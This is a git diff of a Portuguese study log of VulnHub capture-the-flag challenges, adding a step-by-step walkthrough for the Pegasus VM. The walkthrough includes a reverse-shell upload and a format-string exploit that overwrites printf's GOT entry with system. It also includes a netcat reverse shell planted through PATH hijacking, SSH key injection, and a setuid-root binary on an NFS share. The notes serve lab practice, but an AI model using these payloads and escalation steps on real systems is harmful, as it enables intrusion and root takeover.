@@ -29,6 +29,7 @@ Desafio 26 - RCE to DMZ machine | Pivoting with NC | DNS zone transfer | MDNS po
 Desafio 27 - Buffer Overflow INTRO - https://www.vulnhub.com/entry/covfefe-1,199/ </br>
 Desafio 28 - XXE server-side request forgery | BoF Ret2Libc // Buffer Overglow Ret2Libc Exploit development - https://www.vulnhub.com/entry/jigsaw-1,310/</br>
 Desafio 29 - - https://www.vulnhub.com/entry/pegasus-1,109/ </br>
+Desafio 30 - - https://www.vulnhub.com/entry/brainpan-1,51/</br>
 <br/>**--VM--**
 
 <br> <h2>[Write-up vídeo](https://www.youtube.com/channel/UCnWSqlqL8D365ps5IECrPyg) </h2></br>
@@ -1490,3 +1491,148 @@ apt intall gdb
 					
 					vm_alvo: python beco28.py
 						root
+
+
+
+
+
+<h3>Dia 29 			5/10/2020</h3>
+
+	apt-get install gcc-multilib
+	apt-get install g++-multilib
+
+	*scan nmap 
+	
+	*dirb http://192.168.100.36:8088  /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -X .php
+	
+		#submit.php
+		#codereview.php -> https://gist.github.com/0xabe-io/916cf3af33d1c0592a90 -> shell reverse.c -> modificar ip
+		
+	*nc -lnvp 8081
+	*submit codereview
+		
+		*nc
+		
+			python -c 'import pty;pty.spawn("/bin/bash")'
+			
+			python -c 'print("1\n1\n" + "AAAA" + "%8$x")' | ./my_first
+			
+			./my_first
+				gdb ./my_first     (dados podem variar! não copie)
+				break __libc_start_main
+				run
+				print system
+					# 0xb75eb060
+					    0xb75de060
+				quit
+				
+			*objdump -R my_first		
+				 #printf OFFSET -> 0x08049bfc
+				
+			*	ulimit -s
+					ulimit -s unlimited
+					ulimit -s
+					
+					
+				python -c 'print("1\n1\n" + "\xfc\x9b\x04\x08" + "%8$n")' > beco29payload
+					
+				*gdb my_first
+				r < beco29payload
+					#0x00000004				
+				print system
+					#0x40069060
+					
+			kali: python -c 'print 0x9060-0x0004'
+				#36956
+				
+				vm: python -c 'print("1\n1\n" + "\xfc\x9b\x04\x08" + "%36956u" +"%8$n")' > beco29payload
+				gdb ./my_first
+				
+				run < beco29payload
+					#0x00009060
+			
+				converter printf OFFSET para decimal -> https://www.rapidtables.com/convert/number/decimal-to-hex.html -> from hexadecimal to decimal
+					#Decimal number: 134519804
+					
+					SWAP
+						decimal -> hexadecima	= 134519806	
+						 #8049BFE
+						
+						
+					kali: python -c 'print  0x14006-0x9060'
+						#44966
+						
+						
+				python -c 'print("1\n1\n" + "\xfc\x9b\x04\x08" + "\xfe\x9b\x04\x08" + "%36952u" + "%8$n" + "%44966u"  + "%9$n" )' > beco29payload
+				
+				gdb ./my_first
+				
+				run < beco29payload
+					# sh: 1: Selection:: not found 
+					
+					
+					
+				kali: msfvenom -p cmd/unix/reverse_netcat lhost=192.168.100.22 lport=443 -f raw
+					mkfifo /tmp/nhlhf; nc 192.168.100.22 443 0</tmp/nhlhf | /bin/sh >/tmp/nhlhf 2>&1; rm /tmp/nhlhf > Selection\:       ↔  modifique ip e porta se precisar
+					
+				vm: /home/mike
+				echo "mkfifo /tmp/nhlhf; nc 192.168.100.22 443 0</tmp/nhlhf | /bin/sh >/tmp/nhlhf 2>&1; rm /tmp/nhlhf" > Selection\: 
+				chmod +x Selection\:
+				chmod 777 Selection\:
+				
+				export PATH=$PATH:/tmp
+				
+				cat $PATH 
+					...../tmp
+					
+				*kali:  nc -lnvp 443		
+				
+				*vm: python -c 'print("1\n1\n" + "\xfc\x9b\x04\x08" + "\xfe\x9b\x04\x08" + "%36952u" + "%8$n" + "%44966u"  + "%9$n" )'  | ./my_first				
+						ERROS: chmod (Selection\:)  /  ulimit -s   / #PATH
+								
+				
+				*nc 
+					cd /home/john
+					cd .ssh
+					
+						kali: cd ~/.ssh
+							ssh-keygen -t rsa -C john
+							johnkey
+							sem senha -> ENTER
+							
+							cat johnkey.pub
+								#mandar para o authorized_keys da vm
+									echo "asdasd" > authorized_keys
+									chmod 600 authorized_keys
+									
+					kali: ssh -i johnkey john@192.168.100.36
+					
+					sudo -l
+						#/usr/local/sbin/nfs
+						sudo  /usr/local/sbin/nfs start
+						
+						kali: nmap -sV --script=nfs-showmount 192.168.100.36    ////  showmount -e 192.168.100.36
+						
+						cd /tmp
+						mkdir beco29
+						mount -t nfs 192.168.100.36:/opt/nfs beco29
+						cd beco29
+						
+						kali:
+						
+						nano  xpl.c
+						#include <stdlib.h>
+						
+						int main() {
+       					system("/bin/bash"); }
+							
+							gcc xpl.c -o becoxpl  -m32
+							
+							cp becoxpl beco29
+							chmod 4777  becoxpl
+						
+						vm_ssh:
+							cd /opt/nfs
+							./becoxpl
+							 
+							root
